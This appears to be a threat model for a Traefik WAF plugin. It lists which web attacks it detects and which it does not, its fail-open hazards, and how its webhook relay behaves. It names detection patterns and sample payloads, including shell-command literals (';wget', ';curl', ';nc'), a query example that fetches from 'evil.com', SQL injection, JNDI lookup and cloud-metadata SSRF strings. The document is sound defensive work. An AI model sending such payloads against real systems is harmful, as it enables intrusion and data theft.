# Threat Model - purple-wolf v0.4.5

This document is the source of truth for what purple-wolf is and is not
designed to protect against. Adopters should read it before deploying;
auditors should diff it against any future PR that changes detector
behavior.

The model is intentionally narrow. A WAF that promises more than it
delivers is worse than no WAF - operators wire their alerting around
the promise and discover the gap during an incident.

---

## 1. Trust boundaries

```
   public internet
        │
   ┌────▼────┐
   │ trusted │  (your CDN / ALB / Cloudflare / etc. - operator-owned)
   │  edge   │
   └────┬────┘
        │
   ┌────▼─────────────────────────────────────────────────┐
   │ Traefik HA (platform-managed)                         │
   │  ├─ TLS termination, routing, rate-limit, retries     │
   │  └─ http-wasm plugin host (wazero)                    │
   │      └─ purple-wolf-traefik (this project)            │
   │          └─ purple-wolf-core (the detection engine)   │
   └────┬─────────────────────────────────────────────────┘
        │
   ┌────▼────┐
   │ tenant   │ (the application being protected)
   │ backend  │
   └─────────┘
```

The plugin runs inside Traefik's wazero sandbox. From the engine's
perspective:

- **Untrusted:** every byte of the HTTP request - method, URI, every
  header value, body up to `body.maxInspectBytes`. We assume an
  attacker controls all of these.
- **Trusted-by-config:** the `X-Forwarded-For` chain. By default the
  engine ignores it entirely (`xff.trustedHops: 0`) and uses the TCP
  peer as the source IP. Operators opt in to trusting N rightmost
  XFF entries via `xff.trustedHops: N`; misconfiguring this is a
  self-DoS primitive (see §4.1).
- **Trusted:** the Middleware config bytes the host hands the plugin
  via the http-wasm `get_config` import. If an attacker can write
  arbitrary Middleware YAML in the cluster, they are already past the
  WAF and can simply disable it.
- **Trusted:** the Traefik host process. The plugin runs inside its
  address space (sandboxed by wazero), but a compromised Traefik can
  bypass the plugin trivially by just not calling it.

---

## 2. In scope (what purple-wolf v0.4.5 is designed to catch)

| Attack class | Detector | Notes |
|---|---|---|
| SQL injection in URL/query | `injection` (libinjection) | Context-aware tokenizer |
| SQL injection in request body | `injection` | Raw bytes; non-UTF-8 safe |
| SQL injection in headers (Cookie, Referer, X-*, Host, Authorization, User-Agent) | `injection` | Both raw and percent-decoded |
| XSS in URL/query | `injection` (libinjection) | HTML5 tokenizer |
| XSS in request body | `injection` | |
| XSS in allow-listed headers | `injection` | |
| Path traversal (`../`, `..\\`, `....//`, `/etc/passwd`) | `signatures` | Literal aho-corasick |
| RCE primitives (`$(`, `` ` ``, `/bin/sh`, `;wget`, `;curl`) | `signatures` | Literal, narrow |
| Scanner User-Agents (sqlmap, nikto, nuclei) | `signatures` | Case-insensitive |
| Method allow-list (anything outside GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS) | `structural` | Defense in depth - Traefik usually rejects upstream |
| Oversized header size / count | `structural` | 16 KiB / 100 headers |
| Per-IP rate limiting | `reputation` | Bounded LRU token bucket |
| Per-IP deny list | `reputation` | Operator-supplied list |
| Log4Shell-style `${jndi:...}` lookup | `signatures` | Case-insensitive literal |

The signature detector reports each compile-time literal at most once per
request. Repeating a one-byte signature throughout a buffered body therefore
cannot amplify verdict/detail allocations beyond the static signature-table
size; distinct signatures are still reported independently.

---

## 3. Out of scope (explicit non-goals)

### 3.1 Non-goals at the architectural level

- **TLS termination, certificate management, routing decisions.**
  Traefik owns these. The plugin runs after Traefik has decided
  routing and TLS is terminated.
- **Cluster-wide shared rate-limit state.** Rate-limit state lives in
  WASM linear memory per pooled guest instance, per Middleware, per Traefik
  pod. Concurrent requests can be distributed across guests, so this is not
  a strict pod-wide quota and the effective aggregate can exceed
  `configured × pod_count`. A shared-state backend is not shipped in v0.4.5.
- **Streaming body inspection.** The plugin reads up to
  `body.maxInspectBytes` (default 1 MiB) into WASM memory. With
  `overCap: pass`, it continues draining and reconstructing the body through
  the host ABI without retaining the overflow in guest memory; with
  `overCap: block`, it rejects as soon as overflow is proven. Detection past
  the prefix is still out of scope, and pass mode adds host-side buffering
  and full-body drain latency before the backend runs.
- **Stateful detection across requests.** Each request is inspected
  independently. Pattern-based "scanner X probed 12 endpoints in the
  last minute → escalate" is out of scope; rely on Loki / Promtail
  derived metrics from the audit-log fields.
- **Application-level authorization.** The WAF blocks payloads; it
  does not understand "this user is allowed to read this resource".

### 3.2 Non-goals at the detection level

- **OWASP CRS rule parity.** purple-wolf is hybrid by design
  (libinjection context-aware tokenizer + literal signatures +
  structural). The CRS regression suite measures at ~22% honest
  detection (XSS 45%, SQLi 18%; see `tests/crs_replay.rs`) because
  CRS exercises atomic-token tests (bare `INFORMATION_SCHEMA`,
  `OR 1=1` without quotes) that libinjection deliberately won't flag
  in isolation.
- **Template injection (`{{7*7}}`, `{%`).** No detector ships for
  Jinja/Twig/ERB-style SSTI. Future work.
- **SSRF (`http://169.254.169.254/`, `gopher://`, `file://`).** No
  cloud-metadata or scheme-based signature ships. Future work.
- **NoSQL injection (`$where`, `$ne`).** Not covered. Future work.
- **Prototype pollution (`__proto__`, `constructor.prototype`).** Not
  covered. Future work.
- **CRLF injection / HTTP request smuggling.** Mostly out of the
  plugin's hands - Traefik filters CRLF before the plugin sees the
  request, and HTTP/2 doesn't carry CRLF at all. The plugin won't
  detect a smuggling attempt that already made it past Traefik.
- **Tenant-customizable signature lists.** The signature table in
  `crates/purple-wolf-core/src/detectors/signatures.rs` is
  compile-time. A tenant cannot add a custom literal without forking
  and recompiling. Future work.

### 3.2.1 Empirically observed detection gaps closed since round 2

The round-2 live-stack benchmark in [`docs/benchmark.md`](docs/benchmark.md)
surfaced two concrete misses: User-Agent SQLi with a browser-like
`Mozilla/` prefix and bare shell-command query payloads such as
`?cmd=;wget evil.com/x`. Both are closed in v0.4+:

- **User-Agent SQLi with a `Mozilla/` prefix.** The injection detector
  now re-probes the User-Agent suffix with libinjection after removing
  the browser-shaped prefix token, so `User-Agent: Mozilla/5.0 1 OR
  1=1` is inspected as an isolated SQL tail instead of a complete UA
  string.
- **Bare shell-command primitives in query strings (`;wget`, `;curl`,
  `;nc`, `;bash`).** The signature table now includes collision-aware
  `rce_cmd` literals for those query forms.

The benchmark numbers have not yet been rerun after these fixes. Treat
the published benchmark as historical live-stack evidence plus current
code-level fixes, not as fresh v0.4.5 live-stack benchmark evidence.

### 3.3 Non-goals at the integrity level

- **Validation of the plugin binary itself.** Cosign keyless
  signatures are produced at release time (see `release.yml`) and
  consumers SHOULD verify them, but we don't ship a runtime self-check.
  A compromised release artifact mounted into Traefik is by
  construction undetectable from inside the plugin.
- **Side-channel resistance.** A timing oracle on libinjection's
  worst-case input is in principle observable; we don't make
  cryptographic timing claims.

---

## 4. Known operational hazards

These are not "bugs" - they are documented behaviors a careful
operator should understand.

### 4.1 Self-DoS via misconfigured `xff.trustedHops`

If you set `xff.trustedHops` higher than your actual trusted-proxy
count, attackers can spoof the leftmost XFF entry and:
- pin the per-IP rate-limit budget for an arbitrary IP (impersonation
  DoS against a victim); or
- rotate spoofed IPs to inflate the rate-limit map's memory footprint
  (bounded at `reputation.maxTrackedIps`, default 50,000 - bounded
  DoS but real load).

**Mitigation:** default `xff.trustedHops` is `0` (use TCP peer, ignore
XFF). Only opt in to the count of *actually trusted* proxies between
your wasm guest and the public internet. Also configure Traefik's own
`entryPoints.<name>.forwardedHeaders.trustedIPs` so it strips
untrusted XFF before the plugin sees the request.

### 4.2 `body.overCap: pass` is a body-bypass tradeoff

The default `overCap: pass` inspects the first `maxInspectBytes`, records
`body_truncated: true` on noteworthy audit events, reconstructs the entire
request body, and forwards it. Bytes after the cap remain uninspected, so an
attacker can still hide a body-only payload after enough benign padding; the
prefix inspection closes the simpler bypass where the payload was already
inside the retained prefix.

**Mitigation:** raise `maxInspectBytes` up to the 16 MiB guest allocation
ceiling (memory cost) or switch to
`overCap: block` (correctness cost - any legitimate large upload
returns 403).

### 4.3 Fail-open paths, and the panic/trap reality

Paths that bypass detection without blocking:
- libinjection returning `ERROR = -1` (`crates/purple-wolf-core/src/ffi.rs:23,33`).
  In practice libinjection's API never returns -1 for `is_sqli`; the
  XSS path can in pathological inputs. Both treat -1 as benign.
- An over-cap body with `overCap: pass`. As of the robustness pass the
  buffered prefix (the first `maxInspectBytes`) is now inspected and the
  audit log carries `body_truncated: true`, so this is no longer a free
  bypass (the payload must sit *past* the cap) and it is now visible - but
  bytes beyond the cap still go un-inspected. See §4.2.

**Panic handling - important correction.** Earlier docs claimed a detector
panic is "caught by `catch_unwind` and `failMode` is applied." That is
**false on the shipped guest.** The `wasm32-wasip1` target is
`panic = "abort"` on stable Rust: unwinding does not exist there, so the
`catch_unwind` in `crates/purple-wolf-traefik/src/entry.rs` cannot intercept
a panic. A genuine panic *traps the whole Wasm instance*, and Traefik applies
its own plugin-failure path (a 5xx) - which means a panic does **not** honor
`failMode` and a `failOpen` deployment effectively fails *closed* on a
panic-inducing input.

The defense is therefore structural, not recovery-based: panics are excluded
from production code by `deny(clippy::unwrap_used / expect_used / panic)` in
each crate's `lib.rs` (the sole audited exception is the compile-time
signature-table build), and fuzz targets (`fuzz/fuzz_targets/`) exist to
surface any remaining panic path. The `catch_unwind` is retained only for
native embeddings, where unwinding works.

`failMode` is honored when request-buffer feature negotiation fails before
the body is touched. A host stream failure after incremental body
reconstruction begins is forced closed because forwarding a partially rebuilt
body would violate HTTP compatibility. A poisoned reputation mutex still
fails open locally inside that detector; `overCap: block` is an explicit body
policy, not a `failMode` path.

Operators still cannot tell from metrics exactly how much traffic hits the
libinjection `-1` path. Future work: a `purple_wolf_health` counter line the
relay can scrape, and a `soft_failure: true` audit field.

### 4.4 Detector order vs. severity in the audit log

Pre-NEW-H1 the audit-log `blocked_rule` named whichever enforced
verdict fired first. Post-fix, the highest-severity enforced verdict
wins; on ties, the first detector in `Injection → Signatures →
Structural → Reputation` order wins. The `would_block_rules` array
preserves the rest, so no detection is lost.

---

## 5. What to monitor in production

- `action: "block"` count, per `blocked_rule` - your true positives + FPs.
- `action: "allow"` count with non-empty `would_block_rules` - monitor-mode
  signal; use to tune before flipping to enforce.
- Plugin failure rate from Traefik's metrics
  (`traefik_middleware_request_total{code="500"}`) - should be near zero.
  Because `wasm32-wasip1` is `panic = "abort"` (§4.3), a spike here means
  detector panics are *trapping the guest* (not being caught), so requests
  are failing closed regardless of `failMode`. Treat any sustained 5xx from
  the middleware as a correctness bug to fix, not steady-state behavior.
- `source_ip` cardinality from the audit log - sudden growth into the
  cap (50k entries by default) indicates IP-rotation DoS attempts.
- `body.overCap` 403s - see §4.2.
- `pwrelay_deliveries_total{outcome="dlq"}` - see §7.
- `pwrelay_deliveries_total{outcome="dropped_queue_full"}` - sustained
  growth means a subscriber is consistently slower than event arrival
  rate; raise that subscriber's `subscriber_queue` or reduce its
  filter scope.

---

## 7. Webhook delivery (purple-wolf-relay)

The relay is a *separate* process that sits outside the WAF's trust
boundary. It tails Traefik's stdout, parses the purple-wolf audit JSON,
and delivers HMAC-signed HTTP POSTs to operator-configured subscribers.
The protocol contract lives in [`docs/webhook-protocol.md`](docs/webhook-protocol.md).

### 7.1 Trust model

- The relay has **no inbound trust** from subscribers - it only sends.
  Subscribers expose an HTTP endpoint; the relay never accepts
  webhooks back. The admin surface is intended for cluster-internal
  scrape only. Optional bearer auth can protect `/metrics` and
  `/version`; `/healthz` and `/readyz` stay unauthenticated so
  orchestrator probes continue to work.
- Each subscriber is identified by a shared HMAC secret. The relay
  references secrets via `secret_env` or `secret_file` - they must
  not be inlined in YAML. Secrets are held in
  `zeroize::Zeroizing<Vec<u8>>` and wiped on drop.
- The relay is **best-effort with in-process retries**, not a durable
  at-least-once queue. Subscribers MUST still dedupe on `event_id` (stable
  across retries) and verify the HMAC before processing. The reference subscribers in
  `crates/purple-wolf-relay/examples/subscribers/` (Python / Go /
  TypeScript) implement both.

### 7.2 Failure modes and operator action

- **Subscriber endpoint down.** Events flow into the per-subscriber
  bounded mpsc; the sink retries with exponential backoff. After
  `retry.max_attempts` the envelope lands in the in-memory DLQ
  (bounded; oldest dropped on overflow). Watch the `pwrelay_dlq_depth`
  gauge and the `pwrelay_deliveries_total{outcome="dlq"}` counter.
- **Subscriber endpoint returns 4xx (non-408/429).** Treated as a
  permanent client-side problem (bad URL, expired secret, invalid
  schema) → envelope to DLQ, no retry. Fix the subscriber config and
  restart/replay from the source where possible; an authenticated DLQ
  replay endpoint is future work.
- **Slow subscriber backpressures fast ones.** Cannot happen: the
  fan-out uses `try_send`, so a full per-subscriber queue drops the
  event for THAT subscriber and increments
  `pwrelay_deliveries_total{outcome="dropped_queue_full"}`.

### 7.3 Secret rotation

1. Generate the new secret out-of-band (`openssl rand -hex 32`).
2. Deploy the new secret to the subscriber side first; subscribers
   should accept either old or new (overlap window).
3. Update the relay's `secret_env` / `secret_file` to the new value
   and restart the relay. Hot reload is future work.
4. After confirming no failed verifications on the subscriber, retire
   the old secret.

### 7.4 What the relay does NOT do

- **No durable DLQ.** The bounded in-memory DLQ is lost on restart;
  SQLite-backed DLQ is future work.
- **No clustering / shared state across instances.** Each relay
  instance bookmarks the log tail independently; running two relays
  against the same log file is supported (with subscriber-side dedup
  on `event_id`) but they don't coordinate DLQs.
- **No replay of audit-log history.** A relay restart resumes from
  the bookmark; events emitted between the WAF's audit-line and the
  bookmark write window may not be re-emitted if the relay crashes
  before a checkpoint.

---

## 8. Reporting issues

See [SECURITY.md](SECURITY.md) for the private disclosure channel.
This document is updated on every change to detection scope or trust
boundary; any PR that touches `crates/purple-wolf-core/src/detectors/`,
`request.rs::client_ip`, or `config.rs::XffConfig` should also update
the relevant section here.
